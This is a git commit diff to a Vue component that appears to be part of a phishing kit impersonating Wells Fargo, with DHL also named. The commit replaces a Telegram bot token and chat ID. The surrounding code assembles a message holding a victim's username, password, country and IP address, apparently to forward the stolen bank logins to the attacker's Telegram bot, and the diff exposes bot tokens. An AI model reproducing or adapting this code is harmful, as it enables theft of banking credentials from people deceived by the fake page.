36af78678a0788136822ded5eb02ba750a6b99a4
estaMan <146589483+estaMan@users.noreply.github.com>
2024-05-18 13:42:08 +0100

    Update four-com.vue

--- src/components/four-com.vue
+++ src/components/four-com.vue
@@ -843,9 +843,9 @@ export default {
       );
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-       var token = "6468151337:AAFByPCItp55Ii7j_kLGuMbJgTx2GzBL6QU";
+       var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
 
-      var chatId2 = -4037845844;
+      var chatId2 = -4219558708;
       var fullMessage = `
        ||🏦💰💰| Wells |🏦💰💰||%0A%0AUserName : ${this.userName}%0A%0APasssword : ${this.password}%0A%0ACountry : ${this.query}%0AIP : ${this.IP}%0A%0A|💲💲💲|💳| DHL|💳|💲💲💲|`;
 
